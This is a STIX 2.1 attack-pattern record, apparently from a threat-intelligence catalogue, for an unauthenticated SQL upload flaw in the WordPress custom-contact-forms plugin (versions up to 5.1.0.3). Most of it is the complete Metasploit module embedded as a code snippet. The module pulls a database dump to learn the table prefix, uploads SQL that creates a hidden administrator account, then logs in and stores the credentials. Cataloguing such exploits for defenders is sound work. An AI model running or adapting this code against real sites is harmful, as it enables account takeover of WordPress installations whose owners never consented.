{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0c9c4c9b-91e6-4765-83e1-633c8578a533",
    "created": "2024-08-14T16:23:18.467374Z",
    "modified": "2024-08-14T16:23:18.467378Z",
    "name": "WordPress custom-contact-forms Plugin SQL Upload",
    "description": " The WordPress custom-contact-forms plugin <= 5.1.0.3 allows unauthenticated users to download a SQL dump of the plugins database tables. It's also possible to upload files containing SQL statements which will be executed. The module first tries to extract the WordPress table prefix from the dump and then attempts to create a new admin user. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/wp_custom_contact_forms.rb",
            "external_id": "wp_custom_contact_forms.rb"
        },
        {
            "source_name": "reference",
            "url": "http://blog.sucuri.net/2014/08/database-takeover-in-custom-contact-forms.html"
        },
        {
            "source_name": "reference",
            "url": "https://plugins.trac.wordpress.org/changeset?old_path=%2Fcustom-contact-forms%2Ftags%2F5.1.0.3&old=997569&new_path=%2Fcustom-contact-forms%2Ftags%2F5.1.0.4&new=997569&sfp_email=&sfph_mail="
        },
        {
            "source_name": "WPVDB",
            "external_id": "7542"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HTTP::Wordpress\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'WordPress custom-contact-forms Plugin SQL Upload',\n        'Description' => %q{\n          The WordPress custom-contact-forms plugin <= 5.1.0.3 allows unauthenticated users to download\n          a SQL dump of the plugins database tables. It's also possible to upload files containing\n          SQL statements which will be executed. The module first tries to extract the WordPress\n          table prefix from the dump and then attempts to create a new admin user.\n        },\n        'Author' => [\n          'Marc-Alexandre Montpas', # Vulnerability discovery\n          'Christian Mehlmauer' # Metasploit module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'URL', 'http://blog.sucuri.net/2014/08/database-takeover-in-custom-contact-forms.html' ],\n          [ 'URL', 'https://plugins.trac.wordpress.org/changeset?old_path=%2Fcustom-contact-forms%2Ftags%2F5.1.0.3&old=997569&new_path=%2Fcustom-contact-forms%2Ftags%2F5.1.0.4&new=997569&sfp_email=&sfph_mail=' ],\n          [ 'WPVDB', '7542' ]\n        ],\n        'DisclosureDate' => '2014-08-07'\n      )\n    )\n  end\n\n  def get_sql(table_prefix, username, password)\n    # create user\n    sql = \"INSERT INTO #{table_prefix}users (user_login, user_pass) VALUES ('#{username}','#{Rex::Text.md5(password)}');\"\n    # make user administrator\n    sql << \"INSERT INTO #{table_prefix}usermeta (user_id, meta_key, meta_value) VALUES ((select id from #{table_prefix}users where user_login='#{username}'),'#{table_prefix}capabilities','a:1:{s:13:\\\"administrator\\\";b:1;}'),((select id from #{table_prefix}users where user_login='#{username}'),'#{table_prefix}user_level','10');\"\n\n    sql\n  end\n\n  def get_table_prefix\n    res = send_request_cgi({\n      'uri' => wordpress_url_admin_post,\n      'method' => 'POST',\n      'vars_post' => {\n        'ccf_export' => '1'\n      }\n    })\n    return nil if res.nil? || res.code != 302 || res.headers['Location'] !~ /\\.sql$/\n\n    file = res.headers['Location']\n    res_file = send_request_cgi('uri' => file)\n    return nil if res_file.nil? || res_file.code != 200 || res_file.body.nil?\n\n    match = res_file.body.match(/insert into `(.+_)customcontactforms_fields`/i)\n    return nil if match.nil? || match.length < 2\n\n    table_prefix = match[1]\n    table_prefix\n  end\n\n  def run\n    username = Rex::Text.rand_text_alpha(10)\n    password = Rex::Text.rand_text_alpha(20)\n\n    print_status('Trying to get table_prefix')\n    table_prefix = get_table_prefix\n    if table_prefix.nil?\n      print_error('Unable to get table_prefix')\n      return\n    else\n      print_status(\"got table_prefix '#{table_prefix}'\")\n    end\n\n    data = Rex::MIME::Message.new\n    data.add_part(get_sql(table_prefix, username, password), 'text/plain', nil, \"form-data; name=\\\"import_file\\\"; filename=\\\"#{Rex::Text.rand_text_alpha(5)}.sql\\\"\")\n    data.add_part('1', nil, nil, 'form-data; name=\"ccf_merge_import\"')\n    post_data = data.to_s\n\n    print_status(\"Inserting user #{username} with password #{password}\")\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => wordpress_url_admin_post,\n      'ctype' => \"multipart/form-data; boundary=#{data.bound}\",\n      'data' => post_data\n    )\n\n    if res.nil? || res.code != 302 || res.headers['Location'] != 'options-general.php?page=custom-contact-forms'\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Upload failed\")\n    end\n\n    # test login\n    cookie = wordpress_login(username, password)\n\n    # login successful\n    if cookie\n      print_good(\"User #{username} with password #{password} successfully created\")\n      store_valid_credential(user: username, private: password, proof: cookie)\n    else\n      print_error('User creation failed')\n      return\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-08-07"
}